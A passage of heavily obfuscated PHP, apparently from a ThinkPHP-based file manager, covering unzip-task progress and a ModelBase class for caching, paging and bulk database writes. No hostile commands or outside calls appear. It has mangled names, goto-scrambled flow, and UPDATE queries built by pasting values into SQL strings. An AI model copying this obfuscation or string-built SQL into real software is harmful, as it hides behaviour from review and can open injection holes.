$DÙğÍİŞÌ = 0; $C¢é©¿†»¬[$aŞØ’İ­­”[1465]] = array($aŞØ’İ­­”[1466] => $DÙğÍİŞÌ + 1, $aŞØ’İ­­”[382] => $e¥·¤Ñ•„ß[$aŞØ’İ­­”[28]], $aŞØ’İ­­”[75] => $e¥·¤Ñ•„ß[$aŞØ’İ­­”[75]], $aŞØ’İ­­”[462] => $e¥·¤Ñ•„ß[$aŞØ’İ­­”[462]] ? $e¥·¤Ñ•„ß[$aŞØ’İ­­”[462]] : $e¥·¤Ñ•„ß[$aŞØ’İ­­”[75]]); goto b½¼¶‘‹…Š; Bë³ÂèÏ†ˆ: $aŞØ’İ­­” =& $_SERVER[Ö]; $C¢é©¿†»¬ =& $this->task; $e¥·¤Ñ•„ß = IO::info($Bô¶òÄ‹á); goto aéğ«ïœÒŒ; Eèí¥Ûùõó: } public function unzipAfter($fğ„èí†µ¶) { goto f®Ú„»²; Eßß§ô©“: $Aá×Û‰ƒì  = IO::infoWithChildren($fğ„èí†µ¶); $D¤¦áš ƒ† = 0; $Då‚—¨ßÕì[$e¬ÇÚñòÚ[1465]] = array($e¬ÇÚñòÚ[1466] => $D¤¦áš ƒ† + 1, $e¬ÇÚñòÚ[382] => $Aá×Û‰ƒì [$e¬ÇÚñòÚ[28]], $e¬ÇÚñòÚ[75] => $Aá×Û‰ƒì [$e¬ÇÚñòÚ[75]], $e¬ÇÚñòÚ[462] => $Aá×Û‰ƒì [$e¬ÇÚñòÚ[462]] ? $Aá×Û‰ƒì [$e¬ÇÚñòÚ[462]] : $Aá×Û‰ƒì [$e¬ÇÚñòÚ[75]]); goto D®Ãµ¶•¿»; f®Ú„»²: $e¬ÇÚñòÚ =& $_SERVER[Ö]; $Då‚—¨ßÕì =& $this->task; $Då‚—¨ßÕì[$e¬ÇÚñòÚ[1482]] = $e¬ÇÚñòÚ[102]; goto Eßß§ô©“; D®Ãµ¶•¿»: if ($Aá×Û‰ƒì [$e¬ÇÚñòÚ[29]] == $e¬ÇÚñòÚ[163]) { $Då‚—¨ßÕì[$e¬ÇÚñòÚ[971]] = 1; } else { $Då‚—¨ßÕì[$e¬ÇÚñòÚ[971]] = $Aá×Û‰ƒì [$e¬ÇÚñòÚ[80]][$e¬ÇÚñòÚ[78]]; } $Då‚—¨ßÕì[$e¬ÇÚñòÚ[973]] = $e¬ÇÚñòÚ[33]; $Då‚—¨ßÕì[$e¬ÇÚñòÚ[1461]] = 0; goto BÖ“ÍÄÎµ‘; BÖ“ÍÄÎµ‘: $Då‚—¨ßÕì[$e¬ÇÚñòÚ[983]] = 0; $Då‚—¨ßÕì[$e¬ÇÚñòÚ[1459]] = 0; $Då‚—¨ßÕì[$e¬ÇÚñòÚ[1460]] = 0; goto c«»Õ¿ÏÙã; AÇ’†ôÄèÂ: $this->update(); self::log($e¬ÇÚñòÚ[1484] . json_encode(array($Då‚—¨ßÕì, $Aá×Û‰ƒì ))); goto b»™â‰ÂˆŠ; c«»Õ¿ÏÙã: $Då‚—¨ßÕì[$e¬ÇÚñòÚ[1457]] = $e¬ÇÚñòÚ[33]; $Då‚—¨ßÕì[$e¬ÇÚñòÚ[1464]] = 0; $Då‚—¨ßÕì[$e¬ÇÚñòÚ[691]] = $Aá×Û‰ƒì [$e¬ÇÚñòÚ[77]]; goto AÇ’†ôÄèÂ; b»™â‰ÂˆŠ: } public function nameParse($F‘Œñõ´æ) { goto C‡õ£»±ñ‰; e–ˆ¨·: $this->update(); goto dÂ²•šî™á; C‡õ£»±ñ‰: $eõ¨‘œÑ¹— =& $_SERVER[Ö]; $CĞÄ‰ªì– =& $this->task; if ($CĞÄ‰ªì–[$eõ¨‘œÑ¹—[1482]] == $eõ¨‘œÑ¹—[1033]) { $CĞÄ‰ªì–[$eõ¨‘œÑ¹—[1482]] = $eõ¨‘œÑ¹—[297]; $CĞÄ‰ªì–[$eõ¨‘œÑ¹—[1464]] = 0; $CĞÄ‰ªì–[$eõ¨‘œÑ¹—[691]] = 0; } goto c¤µ¦˜¹˜¨; c¤µ¦˜¹˜¨: $aÒ ±Ã¦²‰ = get_path_this($F‘Œñõ´æ); if (strstr($aÒ ±Ã¦²‰, $eõ¨‘œÑ¹—[91])) { $CĞÄ‰ªì–[$eõ¨‘œÑ¹—[983]] += 1; $CĞÄ‰ªì–[$eõ¨‘œÑ¹—[971]] += 1; } $CĞÄ‰ªì–[$eõ¨‘œÑ¹—[1457]] = $F‘Œñõ´æ; goto e–ˆ¨·; dÂ²•šî™á: } } goto FÄØŠ¦ãò; fëÚÒÚÂ¨: function beforeShutdown() { Hook::trigger($_SERVER[Ç·ÕÂû¼„][36]); } $_SERVER[$_SERVER[Ç·ÕÂû¼„][37]] = BASIC_PATH; $_SERVER[$_SERVER[Ç·ÕÂû¼„][38]] = LIB_DIR; goto BÆ´øá¯ºŠ; f‰ôÁ¨…†ê: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\x79\x54\x69\155\x65", "\x74\x69\x6d\145", "\151\156\163\145\x72\x74\54\x75\x70\144\141\164\x65", "\146\x75\x6e\x63\x74\151\157\x6e"), array("\x63\162\145\141\164\x65\124\151\155\145", "\x74\x69\x6d\145", "\x69\156\163\x65\x72\164", "\x66\x75\156\143\164\151\x6f\156")); public function setDataAuto($D»®ÓØ’©ï) { $this->dataAuto = $D»®ÓØ’©ï; } public function __construct($Aâ¸µ±Ô = '', $cáÈ°èÑÛŠ = '', $dÍ¬¤»ñ = '') { parent::__construct($Aâ¸µ±Ô, $cáÈ°èÑÛŠ, $dÍ¬¤»ñ); } public static function textEncode($D¢ÉÅáˆ‹Õ) { if (!$D¢ÉÅáˆ‹Õ) { return $D¢ÉÅáˆ‹Õ; } $Bİø„È˜Œõ = json_encode($D¢ÉÅáˆ‹Õ); $Bİø„È˜Œõ = preg_replace_callback($_SERVER[Ö][338], function ($c·öİ³·Õ) { return addslashes($c·öİ³·Õ[0]); }, $Bİø„È˜Œõ); return json_decode($Bİø„È˜Œõ); } public static function textDecode($AÃ¼«Ó§ª) { $d¤‰„•ïßª =& $_SERVER[Ö]; $EÛØ‚‘Œ…¸ = json_encode($AÃ¼«Ó§ª); $EÛØ‚‘Œ…¸ = preg_replace_callback($d¤‰„•ïßª[339], function ($a¾íê«°–ì) { return $_SERVER[Ö][93]; }, $EÛØ‚‘Œ…¸); return json_decode($EÛØ‚‘Œ…¸); } protected $tableMeta = array(); protected function _beforeInsert(&$bå–øòÂ¨, $FÓ§ï¹‰âÊ) { $e¬„óŒ—êê =& $_SERVER[Ö]; if (!$this->checkDataAutoHas($e¬„óŒ—êê[340])) { return; } $this->dataBeforeFilter($bå–øòÂ¨, $e¬„óŒ—êê[340]); } protected function _beforeUpdate(&$d£¬Øó’‡§, $eÛè˜†á´ó) { $bÕµ¢£íà =& $_SERVER[Ö]; if (!$this->checkDataAutoHas($bÕµ¢£íà[341])) { return; } $this->dataBeforeFilter($d£¬Øó’‡§, $bÕµ¢£íà[341]); } protected function _afterSelect(&$DáŸ‚³áƒİ, $cÅÎÊõ’Ç®) { if (!is_array($DáŸ‚³áƒİ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ö][342])) { return; } foreach ($DáŸ‚³áƒİ as &$f©º±‘àõÙ) { $this->dataAfterFilter($f©º±‘àõÙ); } } protected function _afterFind(&$aô†»¶êï¿, $cÕÜ‹•Àƒî) { if (!is_array($aô†»¶êï¿)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ö][342])) { return; } $this->dataAfterFilter($aô†»¶êï¿); } public function setAutoIncrement($AŞ¥÷óÍ„à) { $Fó™¶ñÅÅ¼ = array($this->getPk() => $AŞ¥÷óÍ„à); $D£öÛÏœ™Š = $this->data($Fó™¶ñÅÅ¼)->add(); if ($D£öÛÏœ™Š) { $this->delete($D£öÛÏœ™Š); } } public function getAutoIncrement() { $a›ÑØ‘¶È® = $this->getTableName(); $bÆê·ïÀŠ = $this->max($this->getPk()); $A•’Û•ğ = $this->query("\163\x68\x6f\x77\x20\164\x61\142\x6c\x65\x20\x73\164\x61\x74\x75\163\40\x77\150\x65\x72\145\x20\x4e\141\x6d\145\75\47{$a›ÑØ‘¶È®}\x27"); $E´™øÃÓ¶¢ = $A•’Û•ğ[0][$_SERVER[Ö][343]]; $EÃù¤á“Ô = max($bÆê·ïÀŠ, $E´™øÃÓ¶¢); return $EÃù¤á“Ô; } protected function _callBefore($fµ¥Ù’ã©°, $E²ß¾òÑĞˆ) { return $this->cacheCallCheck($fµ¥Ù’ã©°, $E²ß¾òÑĞˆ, !1); } protected function _callAfter($c„¾Ä­®—, $cáßÛß›ä²) { return $this->cacheCallCheck($c„¾Ä­®—, $cáßÛß›ä², !0); } protected function cacheFunctionAlias($DŠù»¬òãÜ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($cˆ ˆˆˆî, $FŒ÷Æ¯’Ä—, $aäíåé——Ó = false) { $f¿Ñ®¸–î– = $this->cacheFunctionAlias($FŒ÷Æ¯’Ä—); if (!$f¿Ñ®¸–î–) { return; } foreach ($f¿Ñ®¸–î– as $Eí¿¨ë¼Ò => $b™íùëí˜„) { $c®«ˆ·Ûƒï = $b™íùëí˜„[0]; $fÂ‚öù„Ãˆ = explode($_SERVER[Ö][47], $b™íùëí˜„[1]); if ($cˆ ˆˆˆî == $Eí¿¨ë¼Ò) { return $this->cacheFunctionGet($Eí¿¨ë¼Ò, $c®«ˆ·Ûƒï); } if ($aäíåé——Ó && in_array($cˆ ˆˆˆî, $fÂ‚öù„Ãˆ)) { $this->cacheFunctionClear($Eí¿¨ë¼Ò, $c®«ˆ·Ûƒï); } } } public function cacheFunctionGet($AŠ¢ìÂ²Ñ», $f‘¢ËÙâà) { $dµ„Ù®ŸÎÍ = $this->cacheKeyMake($AŠ¢ìÂ²Ñ», $f‘¢ËÙâà); $Eªñµ¨Óì¸ = Cache::get($dµ„Ù®ŸÎÍ); if (!is_array($Eªñµ¨Óì¸)) { $Eªñµ¨Óì¸ = call_user_func_array(array($this, $AŠ¢ìÂ²Ñ»), array($f‘¢ËÙâà, !0)); Cache::set($dµ„Ù®ŸÎÍ, $Eªñµ¨Óì¸); } return $Eªñµ¨Óì¸; } public function cacheFunctionClear($BºÊÚøĞÉÃ, $F ¾¨–ÌµÃ) { $AšÈ”„„Îñ = $F ¾¨–ÌµÃ; if (!is_array($F ¾¨–ÌµÃ)) { $AšÈ”„„Îñ = array($F ¾¨–ÌµÃ); } foreach ($AšÈ”„„Îñ as $f¿—ï™ñ) { $C«£Şğ”‚È = $this->cacheKeyMake($BºÊÚøĞÉÃ, $f¿—ï™ñ); Cache::remove($C«£Şğ”‚È); } } private function cacheKeyMake($Cò¿² Ò, $F³åç£“) { $BÍ Œ°İÂ =& $_SERVER[Ö]; return get_class($this) . $BÍ Œ°İÂ[70] . $Cò¿² Ò . $BÍ Œ°İÂ[344] . $F³åç£“; } protected function selectPage($cĞŒ³‘ëÎ‡ = 200, $A––ƒê–ãâ = 1) { goto e‡³‹à¼Š¶; B· ¼É’ôŒ: $this->optionsValue($Fçªˆ±°ğï); $B‚Ğ½×Öíù = $this->page($A––ƒê–ãâ, $cĞŒ³‘ëÎ‡)->select(); $B‚Ğ½×Öíù = is_array($B‚Ğ½×Öíù) ? $B‚Ğ½×Öíù : array(); goto c¡°…£˜Ó; e‡³‹à¼Š¶: $FÅ¼«Íœêô =& $_SERVER[Ö]; global $in; $Fçªˆ±°ğï = $this->optionsValue(); goto aÍ‹Û„»õò; aÍ‹Û„»õò: $cÓ´ÛøÄù = 4000; $cĞŒ³‘ëÎ‡ = isset($in[$FÅ¼«Íœêô[345]]) ? $in[$FÅ¼«Íœêô[345]] : $cĞŒ³‘ëÎ‡; if ($cĞŒ³‘ëÎ‡ === -1) { unset($in[$FÅ¼«Íœêô[345]]); $cÓ´ÛøÄù = 100000000; $cĞŒ³‘ëÎ‡ = $cÓ´ÛøÄù; } goto Bí‚ªŒ‹‡›; c³ôŠÕİ±·: $cïôÜêÎÄ = ceil($AÆíÒ¡ùœ / $cĞŒ³‘ëÎ‡); $A––ƒê–ãâ = intval(isset($in[$FÅ¼«Íœêô[336]]) ? $in[$FÅ¼«Íœêô[336]] : $A––ƒê–ãâ); $A––ƒê–ãâ = $A––ƒê–ãâ <= 1 ? 1 : ($A––ƒê–ãâ >= $cïôÜêÎÄ ? $cïôÜêÎÄ : $A––ƒê–ãâ); goto B· ¼É’ôŒ; DôÆ÷š¶É²: $AÆíÒ¡ùœ = intval($this->count()); $cĞŒ³‘ëÎ‡ = intval($cĞŒ³‘ëÎ‡); $cĞŒ³‘ëÎ‡ = $cĞŒ³‘ëÎ‡ <= 5 ? 5 : ($cĞŒ³‘ëÎ‡ >= $cÓ´ÛøÄù ? $cÓ´ÛøÄù : $cĞŒ³‘ëÎ‡); goto c³ôŠÕİ±·; c¡°…£˜Ó: if ($cïôÜêÎÄ == 1) { $AÆíÒ¡ùœ = count($B‚Ğ½×Öíù); } $b­±Ä†àôò = array($FÅ¼«Íœêô[347] => array($FÅ¼«Íœêô[348] => $AÆíÒ¡ùœ, $FÅ¼«Íœêô[345] => $cĞŒ³‘ëÎ‡, $FÅ¼«Íœêô[336] => $A––ƒê–ãâ, $FÅ¼«Íœêô[349] => $cïôÜêÎÄ), $FÅ¼«Íœêô[350] => $B‚Ğ½×Öíù ? $B‚Ğ½×Öíù : array()); return $b­±Ä†àôò; goto eŠ²ÑÈãÅ; Bí‚ªŒ‹‡›: $FŠ©À¿ = $Fçªˆ±°ğï; $FŠ©À¿[$FÅ¼«Íœêô[346]] = array(); $this->optionsValue($FŠ©À¿); goto DôÆ÷š¶É²; eŠ²ÑÈãÅ: } protected function checkLength($dàÙõÁÎ³, $E–ğàÁÊë§ = 0, $A–œ›Ó·° = '') { $eŸöˆ¾÷Š¨ =& $_SERVER[Ö]; $E–ğàÁÊë§ = $E–ğàÁÊë§ ? $E–ğàÁÊë§ : 65536; if (!$dàÙõÁÎ³ || strlen($dàÙõÁÎ³) < $E–ğàÁÊë§) { return; } $A–œ›Ó·° = $A–œ›Ó·° ? $A–œ›Ó·° . $eŸöˆ¾÷Š¨[67] : $eŸöˆ¾÷Š¨[33]; show_json($A–œ›Ó·° . LNG($eŸöˆ¾÷Š¨[351]) . "\50{$E–ğàÁÊë§}\51", !1); } protected function metaSet($D¹Øƒ¹ùí, $AíìªÏ¦•é = null, $bÑ»åéå·Œ = null) { goto A¦÷¨Ğ…Ñõ; fœ—Œ¡ïØ”: if (is_null($AíìªÏ¦•é)) { return $bîˆ¶ÅĞ‡‡->where(array($cÎï­ÒöÄ => $D¹Øƒ¹ùí))->delete(); } if (is_null($bÑ»åéå·Œ)) { return $bîˆ¶ÅĞ‡‡->where($C«‡Î«À„Ü)->delete(); } $Cë¯Æ©õ´ = is_array($AíìªÏ¦•é) ? $AíìªÏ¦•é : array(); goto D¾®£‘ß´Ì; D¾®£‘ß´Ì: if (is_string($AíìªÏ¦•é)) { $Cë¯Æ©õ´[$AíìªÏ¦•é] = $bÑ»åéå·Œ; } $dÃ¿Ó÷²½Ç = array(); foreach ($Cë¯Æ©õ´ as $dÂ¸Ïˆë† => $e„é™µ®Ü) { $this->checkLength($e„é™µ®Ü, !1, $eÌƒ»Û·¨† . $AÛª‚ÒœùÃ[4] . $dÂ¸Ïˆë†); $dÃ¿Ó÷²½Ç[] = array($cÎï­ÒöÄ => $D¹Øƒ¹ùí, $AÛª‚ÒœùÃ[89] => $dÂ¸Ïˆë†, $AÛª‚ÒœùÃ[355] => $e„é™µ®Ü); } goto B¼„Ÿå™×–; A¦÷¨Ğ…Ñõ: $AÛª‚ÒœùÃ =& $_SERVER[Ö]; if (!$this->tableMeta) { return !1; } $cÎï­ÒöÄ = $this->tableMeta[$AÛª‚ÒœùÃ[352]]; goto bŒÜƒ¼©‹°; B¼„Ÿå™×–: $bîˆ¶ÅĞ‡‡->where(array($cÎï­ÒöÄ => $D¹Øƒ¹ùí))->addAll($dÃ¿Ó÷²½Ç, array(), !0); return !0; goto cŞ’åì¨Ù›; bŒÜƒ¼©‹°: $eÌƒ»Û·¨† = $this->tableMeta[$AÛª‚ÒœùÃ[353]]; $bîˆ¶ÅĞ‡‡ = Model($eÌƒ»Û·¨†); $C«‡Î«À„Ü = array($cÎï­ÒöÄ => $D¹Øƒ¹ùí, $AÛª‚ÒœùÃ[354] => $AíìªÏ¦•é); goto fœ—Œ¡ïØ”; cŞ’åì¨Ù›: } public function metaGet($Fíè´¢Úß·) { goto d‡ùŸ¯Æí•; d‚÷¹çš×Ã: $dÑš‰âã = Model($this->tableMeta[$D–ÍÏÒ—³à[353]]); $b ¢Å”¿ô­ = array($fáƒ£‘Ì¯ => $Fíè´¢Úß·); $A¶°¡ áÂŒ = $dÑš‰âã->field($D–ÍÏÒ—³à[356])->where($b ¢Å”¿ô­)->select(); goto C°¦ÄÁî‚ò; C°¦ÄÁî‚ò: $A¶°¡ áÂŒ = array_to_keyvalue($A¶°¡ áÂŒ, $D–ÍÏÒ—³à[89], $D–ÍÏÒ—³à[355]); return $A¶°¡ áÂŒ; goto a²°‘¶—å¾; d‡ùŸ¯Æí•: $D–ÍÏÒ—³à =& $_SERVER[Ö]; if (!$this->tableMeta) { return array(); } $fáƒ£‘Ì¯ = $this->tableMeta[$D–ÍÏÒ—³à[352]]; goto d‚÷¹çš×Ã; a²°‘¶—å¾: } private function checkDataAutoHas($aŒºèÆŸË) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $A©–¾¸¤–½) { if (in_array($aŒºèÆŸË, explode($_SERVER[Ö][47], $A©–¾¸¤–½[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$C¬Äñ÷Œä™, $D¨Òã¥šÙÜ) { $F™³‚ğà =& $_SERVER[Ö]; foreach ($this->dataAuto as $c¦¯ŠÊ­Ø¹) { $a—³´Õ´Ø = $c¦¯ŠÊ­Ø¹[0]; if (!in_array($D¨Òã¥šÙÜ, explode($F™³‚ğà[47], $c¦¯ŠÊ­Ø¹[2]))) { continue; } switch (trim($c¦¯ŠÊ­Ø¹[3])) { case $F™³‚ğà[305]: case $F™³‚ğà[306]: $DŒÛåÊ„…­ = $c¦¯ŠÊ­Ø¹[1]; $e’Í–ò±æ = isset($c¦¯ŠÊ­Ø¹[4]) ? (array) $c¦¯ŠÊ­Ø¹[4] : array(); if ($DŒÛåÊ„…­ == $F™³‚ğà[186] && array_key_exists($a—³´Õ´Ø, $C¬Äñ÷Œä™)) { if (!$C¬Äñ÷Œä™[$a—³´Õ´Ø]) { unset($C¬Äñ÷Œä™[$a—³´Õ´Ø]); } break; } if (isset($C¬Äñ÷Œä™[$a—³´Õ´Ø])) { array_unshift($e’Í–ò±æ, $C¬Äñ÷Œä™[$a—³´Õ´Ø]); } if ($F™³‚ğà[305] == $c¦¯ŠÊ­Ø¹[3]) { $C¬Äñ÷Œä™[$a—³´Õ´Ø] = call_user_func_array($DŒÛåÊ„…­, $e’Í–ò±æ); } else { $C¬Äñ÷Œä™[$a—³´Õ´Ø] = call_user_func_array(array(&$this, $DŒÛåÊ„…­), $e’Í–ò±æ); } break; case $F™³‚ğà[257]: $C¬Äñ÷Œä™[$a—³´Õ´Ø] = $C¬Äñ÷Œä™[$c¦¯ŠÊ­Ø¹[1]]; break; case $F™³‚ğà[278]: if (isset($C¬Äñ÷Œä™[$a—³´Õ´Ø]) && !is_string($C¬Äñ÷Œä™[$a—³´Õ´Ø])) { $C¬Äñ÷Œä™[$a—³´Õ´Ø] = json_encode_force($C¬Äñ÷Œä™[$a—³´Õ´Ø]); } break; case $F™³‚ğà[307]: if ($C¬Äñ÷Œä™[$a—³´Õ´Ø] === $F™³‚ğà[33]) { unset($C¬Äñ÷Œä™[$a—³´Õ´Ø]); } break; case $F™³‚ğà[308]: $C¬Äñ÷Œä™[$a—³´Õ´Ø] = $c¦¯ŠÊ­Ø¹[1]; default: break; } } if ($D¨Òã¥šÙÜ == $F™³‚ğà[340]) { $c­ƒïàß—³ = strtolower($this->db->getDbType()); if (strpos($c­ƒïàß—³, $F™³‚ğà[9]) !== 0) { return; } $FÅËÈÙÖèÛ = $this->field(!0)->fields; $e ÉÀÍ²¸ = $FÅËÈÙÖèÛ[$F™³‚ğà[236]]; if (isset($FÅËÈÙÖèÛ[$F™³‚ğà[235]])) { unset($e ÉÀÍ²¸[$FÅËÈÙÖèÛ[$F™³‚ğà[235]]]); } foreach ($e ÉÀÍ²¸ as $D…ŞÇéâÀÁ => $D¨Òã¥šÙÜ) { if (!isset($C¬Äñ÷Œä™[$D…ŞÇéâÀÁ])) { $C¬Äñ÷Œä™[$D…ŞÇéâÀÁ] = $F™³‚ğà[33]; } } } } private function dataAfterFilter(&$Dáµ¦¯÷…±) { $F‰³›ø’‹¤ =& $_SERVER[Ö]; foreach ($this->dataAuto as $bÇÁ‘•Ú‚¦) { $dÅ°æ÷÷Æ = $bÇÁ‘•Ú‚¦[0]; if (!in_array($F‰³›ø’‹¤[342], explode($F‰³›ø’‹¤[47], $bÇÁ‘•Ú‚¦[2]))) { continue; } if (!isset($Dáµ¦¯÷…±[$dÅ°æ÷÷Æ])) { continue; } switch (trim($bÇÁ‘•Ú‚¦[3])) { case $F‰³›ø’‹¤[305]: case $F‰³›ø’‹¤[306]: $fõô‹‡î¶ = isset($bÇÁ‘•Ú‚¦[4]) ? (array) $bÇÁ‘•Ú‚¦[4] : array(); array_unshift($fõô‹‡î¶, $Dáµ¦¯÷…±[$dÅ°æ÷÷Æ]); if ($F‰³›ø’‹¤[305] == $bÇÁ‘•Ú‚¦[3]) { $Dáµ¦¯÷…±[$dÅ°æ÷÷Æ] = call_user_func_array($bÇÁ‘•Ú‚¦[1], $fõô‹‡î¶); } else { $Dáµ¦¯÷…±[$dÅ°æ÷÷Æ] = call_user_func_array(array(&$this, $bÇÁ‘•Ú‚¦[1]), $fõô‹‡î¶); } break; case $F‰³›ø’‹¤[257]: $Dáµ¦¯÷…±[$dÅ°æ÷÷Æ] = $Dáµ¦¯÷…±[$bÇÁ‘•Ú‚¦[1]]; break; case $F‰³›ø’‹¤[278]: $d®Ğ §İŒ = $Dáµ¦¯÷…±[$dÅ°æ÷÷Æ]; $Dáµ¦¯÷…±[$dÅ°æ÷÷Æ] = json_decode($d®Ğ §İŒ, !0); if (is_null($Dáµ¦¯÷…±[$dÅ°æ÷÷Æ])) { $Dáµ¦¯÷…±[$dÅ°æ÷÷Æ] = $d®Ğ §İŒ; } break; case $F‰³›ø’‹¤[307]: if ($Dáµ¦¯÷…±[$dÅ°æ÷÷Æ] === $F‰³›ø’‹¤[33]) { unset($Dáµ¦¯÷…±[$dÅ°æ÷÷Æ]); } break; case $F‰³›ø’‹¤[308]: $Dáµ¦¯÷…±[$dÅ°æ÷÷Æ] = $bÇÁ‘•Ú‚¦[1]; default: break; } } } public function saveAll($b½ÌôÊ­Ó‹) { goto aæ¼ˆŠŠ¤“; E¸¸¬Æ‚¼ß: $b½ÌôÊ­Ó‹ = is_array($b½ÌôÊ­Ó‹) ? $b½ÌôÊ­Ó‹ : array(); $aîõé‚™ß = $CŠå¤·çÕ¡[357]; $dƒÍ—•§«ë = 0; goto dÃ‡ ¬Éø·; eæÕè£Şß: $this->chunkEventSet(); goto Bâ‰‹É³ÇØ; dÃ‡ ¬Éø·: $cÆÂâêí¼Œ = array(); $däÚô³Ğ¢ = count($b½ÌôÊ­Ó‹); for ($B½Šœ¨ó¿ = 0; $B½Šœ¨ó¿ < $däÚô³Ğ¢; $B½Šœ¨ó¿++) { $fæÒ Éõ = $b½ÌôÊ­Ó‹[$B½Šœ¨ó¿]; if (!is_array($fæÒ Éõ) || count($fæÒ Éõ) != 4) { continue; } $C²ìæìˆŠ = "\125\x50\x44\101\x54\x45\x20{$E·˜ÓĞ¼º²}\40\123\x45\x54\x20{$fæÒ Éõ[2]}\40\x3d\x20\x43\x41\x53\x45\40{$fæÒ Éõ[0]}\x20\xa"; if ($dƒÍ—•§«ë == 0) { $aîõé‚™ß = $C²ìæìˆŠ; } $cÆÂâêí¼Œ[] = $CŠå¤·çÕ¡[112] . $fæÒ Éõ[1] . $CŠå¤·çÕ¡[112]; $dƒÍ—•§«ë++; $aîõé‚™ß .= "\x20\127\x48\105\x4e\40\x27{$fæÒ Éõ[1]}\47\40\x54\x48\x45\116\x20\x27{$fæÒ Éõ[3]}\47\40\xa"; if ($dƒÍ—•§«ë == $cô¤ŒÂêÂ– || $B½Šœ¨ó¿ == $däÚô³Ğ¢ - 1) { goto e©¼Ü²„İ; e©¼Ü²„İ: $AÃ÷å•õŒÖ = implode($CŠå¤·çÕ¡[47], $cÆÂâêí¼Œ); $aîõé‚™ß .= "\x20\105\x4e\x44\x20\x20\x57\110\105\122\105\40{$fæÒ Éõ[0]}\x20\111\116\40\50{$AÃ÷å•õŒÖ}\51\40"; $this->execute($aîõé‚™ß); goto BÑÆß¦ÙÄ; aÎÌŸÔÀØË: $cÆÂâêí¼Œ = array(); goto a ½èíÇÍ¢; BÑÆß¦ÙÄ: $dƒÍ—•§«ë = 0; $aîõé‚™ß = $C²ìæìˆŠ; $this->chunkEventCheck(count($cÆÂâêí¼Œ)); goto aÎÌŸÔÀØË; a ½èíÇÍ¢: } } goto eæÕè£Şß; aæ¼ˆŠŠ¤“: $CŠå¤·çÕ¡ =& $_SERVER[Ö]; $E·˜ÓĞ¼º² = $this->tablePrefix . $this->tableName; $cô¤ŒÂêÂ– = self::SQL_WHERE_IN_CHUNK; goto E¸¸¬Æ‚¼ß; Bâ‰‹É³ÇØ: } public function saveAllEach($BåİƒÁĞåÅ) { $E¢Œñâ®¼ë =& $_SERVER[Ö]; $C¡ÆİÛÊÔ = $this->tablePrefix . $this->tableName; foreach ($BåİƒÁĞåÅ as $B•ŸŒ˜¥ğ´) { if (!is_array($B•ŸŒ˜¥ğ´) || count($B•ŸŒ˜¥ğ´) != 4) { continue; } $eÀŠ‘™œ¾ = $B•ŸŒ˜¥ğ´[0] . $E¢Œñâ®¼ë[358] . $B•ŸŒ˜¥ğ´[1] . $E¢Œñâ®¼ë[112]; $Dë˜±İŠØù = $B•ŸŒ˜¥ğ´[2] . $E¢Œñâ®¼ë[358] . $B•ŸŒ˜¥ğ´[3] . $E¢Œñâ®¼ë[112]; $EÆ¯­©Îë = "\x75\160\x64\141\164\145\x20{$C¡ÆİÛÊÔ}\x20\x73\x65\x74\40{$Dë˜±İŠØù}\40\167\150\145\162\145\40{$eÀŠ‘™œ¾}\x3b"; $this->execute($EÆ¯­©Îë); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($B¦áš»˜×ˆ = false, $aòÜöï™Æ• = false) { $this->_chunkEvent = $B¦áš»˜×ˆ; $this->_chunkEventParam = $aòÜöï™Æ•; } private function chunkEventCheck($fß©¬ä‹) { if (!$this->_chunkEvent) { return; } $AÀÄóÅÜ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $AÀÄóÅÜ[$_SERVER[Ö][359]] = $fß©¬ä‹; Hook::trigger($this->_chunkEvent, $AÀÄóÅÜ); } public function addAll($fˆÕÚ†­°™, $Cè¤°ì¤ = array(), $f×ÅÈÙÆ’á = false) { goto cÊÆ‡‡Êä; dÃÍê±Ø–ö: if (empty($fˆÕÚ†­°™)) { $this->error = think_lang($A¼½™¬İÓÓ[255]); return !1; } $Cè¤°ì¤ = $this->_parseOptions($Cè¤°ì¤); foreach ($fˆÕÚ†­°™ as $DëŒ¸½í— => $D¶¤¦Ñø) { $fˆÕÚ†­°™[$DëŒ¸½í—] = $this->_facade($D¶¤¦Ñø); $this->_beforeInsert($fˆÕÚ†­°™[$DëŒ¸½í—], $Cè¤°ì¤); } goto CØòğùÅæß; cÊÆ‡‡Êä: $A¼½™¬İÓÓ =& $_SERVER[Ö]; ignore_timeout(); $BôÂ»¾ŒÛõ = self::SQL_WHERE_IN_CHUNK; goto dÃÍê±Ø–ö; CØòğùÅæß: if (method_exists($this->db, $A¼½™¬İÓÓ[256])) { for ($dÓâÒ”øë¬ = 0; $dÓâÒ”øë¬ < count($fˆÕÚ†­°™); $dÓâÒ”øë¬ += $BôÂ»¾ŒÛõ) { $eã¹œ‘æó = array_slice($fˆÕÚ†­°™, $dÓâÒ”øë¬, $BôÂ»¾ŒÛõ); if (!is_array($eã¹œ‘æó) || count($eã¹œ‘æó) == 0) { break; } $e’êÍª„‚ = $this->db->insertAll($eã¹œ‘æó, $Cè¤°ì¤, $f×ÅÈÙÆ’á); $this->chunkEventCheck(count($eã¹œ‘æó)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($fˆÕÚ†­°™ as $DëŒ¸½í— => $D¶¤¦Ñø) { $e’êÍª„‚ = $this->db->insert($D¶¤¦Ñø, $Cè¤°ì¤, $f×ÅÈÙÆ’á); } $this->commit(); } if (!1 !== $e’êÍª„‚) { $b¹ÓŠ‰›Î… = $this->getLastInsID(); if ($b¹ÓŠ‰›Î…) { return $b¹ÓŠ‰›Î…; } } return $e’êÍª„‚; goto eòóĞ¶ßó; eòóĞ¶ßó: } public function save($càƒ†¹œ© = '', $E ëÚ‚Š = array()) { goto eÀ“à«µè; eÀ“à«µè: $B×¼âš´¹õ =& $_SERVER[Ö]; $cõõèŒÓ§ = self::SQL_WHERE_IN_CHUNK; $bªˆ¥îìõ = $this->optionsValue(); goto AÑÅ”¡¡ª; cÛ¯¸¡Á…Å: $FˆÊÍ±ÜŠÓ = $bªˆ¥îìõ[$B×¼âš´¹õ[259]][$B»É©Ê»ö¢][1]; $FˆÊÍ±ÜŠÓ = 